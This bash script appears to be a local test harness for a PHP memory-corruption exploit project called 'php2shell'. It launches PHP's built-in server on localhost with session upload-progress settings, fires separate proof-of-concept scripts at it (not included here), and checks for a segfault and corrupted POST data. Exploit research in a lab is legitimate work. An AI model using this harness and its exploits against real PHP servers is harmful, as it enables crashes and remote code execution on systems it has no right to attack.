#!/bin/bash
# php2shell local lab: spawn php -S (single persistent process), arm the
# orphan, fire the reclaim. Receipts: (a) SIGSEGV in the server (worker
# death) with marker pointers, (b) mutated $_POST reflection bytes.
set -u
PORT=${1:-18083}
BUG=${2:-u}          # u = unserialize context, s = serialize context
ROOT=/tmp/php2shell
SID_U=u0123456789abcdefghijklmnopqrstuv
SID_S=s0123456789abcdefghijklmnopqrstuv

rm -rf "$ROOT"; mkdir -p "$ROOT/sess"
cp /mnt/c/Users/andre/Downloads/php2shell-claude/lab_index.php "$ROOT/index.php"

nohup php -S 127.0.0.1:$PORT -t "$ROOT" \
  -d memory_limit=8M -d display_errors=1 -d log_errors=1 \
  -d post_max_size=32M -d upload_max_filesize=32M \
  -d max_file_uploads=25 \
  -d session.upload_progress.min_freq=0 \
  -d session.save_path="$ROOT/sess" \
  > "$ROOT/server.log" 2>&1 &
SRV=$!
echo "server pid=$SRV port=$PORT bug=$BUG"
sleep 1.2

code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/index.php")
echo "baseline GET: $code (pid $(curl -s http://127.0.0.1:$PORT/index.php | head -1))"

if [ "$BUG" = "u" ]; then
  python3 /mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_U"
else
  python3 /mnt/c/Users/andre/Downloads/php2shell-claude/poc_serialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_S"
fi

sleep 1
if kill -0 $SRV 2>/dev/null; then
  echo "SERVER ALIVE after fire"
else
  echo "SERVER DEAD after fire (worker kill)"
fi
echo "--- server.log tail ---"
tail -25 "$ROOT/server.log"
echo "--- sess dir ---"
ls -la "$ROOT/sess" 2>/dev/null
